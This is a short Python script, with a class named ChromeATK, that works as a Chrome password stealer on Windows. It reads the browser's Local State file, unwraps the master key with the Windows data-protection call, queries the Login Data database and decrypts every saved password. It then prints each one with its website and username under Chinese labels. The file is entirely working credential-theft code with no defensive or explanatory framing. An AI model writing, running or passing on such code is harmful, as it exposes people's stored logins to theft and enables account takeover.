import os,json,base64,sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM 
from win32crypt import CryptUnprotectData


class ChromeATK:
  def __init__(self):
    self.local_state = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Local State'
    self.cookie_path = os.environ['LOCALAPPDATA'] + r"\Google\Chrome\User Data\Default\Login Data"
 
  def get_key(self):
    with open(self.local_state, 'r', encoding='utf-8') as f:
      base64_encrypted_key = json.load(f)['os_crypt']['encrypted_key']
    encrypted_key_with_header = base64.b64decode(base64_encrypted_key)
    encrypted_key = encrypted_key_with_header[5:]
    key_ = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key_
 
  @staticmethod
  def decrypt_string(key, secret, salt=None): 
    nonce, cipher_bytes = secret[3:15], secret[15:]
    aes_gcm = AESGCM(key)
    return aes_gcm.decrypt(nonce, cipher_bytes, salt).decode('utf-8')
 
 
  def password(self):
    sql = "select username_value,password_value,signon_realm from logins"
    with sqlite3.connect(self.cookie_path) as conn:
      cu = conn.cursor()
      res = cu.execute(sql).fetchall()
      cu.close()
      result = []
      key = self.get_key()
 
      for name, encrypted_value,website in res: 
        if encrypted_value[0:3] == b'v10' or encrypted_value[0:3] == b'v11':
          passwd = self.decrypt_string(key, encrypted_value)
        else:
          passwd = CryptUnprotectData(encrypted_value)[1].decode()
        print('网站：{}，账户：{}，口令：{}'.format(website,name, passwd))
 
 
if __name__ == '__main__':
  c = ChromeATK()
  c.password()
